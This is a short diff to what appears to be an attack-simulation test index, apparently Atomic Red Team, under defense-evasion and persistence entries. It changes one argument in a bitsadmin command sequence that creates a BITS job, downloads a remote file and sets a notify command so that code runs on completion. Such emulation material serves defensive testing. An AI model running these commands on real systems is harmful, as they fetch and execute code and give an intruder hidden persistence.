@@ -19113,7 +19113,7 @@ defense-evasion:
         command: |
           bitsadmin.exe /create #{bits_job_name}
           bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
-          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
+          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
           bitsadmin.exe /resume #{bits_job_name}
           timeout 5
           bitsadmin.exe /complete #{bits_job_name}
@@ -37879,7 +37879,7 @@ persistence:
         command: |
           bitsadmin.exe /create #{bits_job_name}
           bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
-          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
+          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
           bitsadmin.exe /resume #{bits_job_name}
           timeout 5
           bitsadmin.exe /complete #{bits_job_name}
